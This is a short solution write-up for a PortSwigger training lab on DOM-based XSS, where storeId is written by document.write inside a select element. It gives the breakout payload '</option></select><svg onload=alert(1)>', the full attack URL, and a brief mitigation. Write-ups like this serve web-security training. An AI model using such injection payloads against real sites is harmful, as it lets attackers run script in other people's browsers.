# Lab 08 — DOM XSS in document.write sink using source location.search inside a select element

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/document-write-select)

**Entry point:** `GET /product/stock?storeId=` — written by `document.write`
inside a `<select><option ...>` block.

## Solution

1. Check the stock page and note the markup built from `storeId`.
2. Close both the option and the select, then inject an element:

```
</option></select><svg onload=alert(1)>
```

3. Deliver as: `/product/stock?storeId=</option></select><svg onload=alert(1)>`
   — the alert fires — lab solved.

## Mitigation

Don't serialize client data into `document.write`; set values through DOM
APIs after parsing.
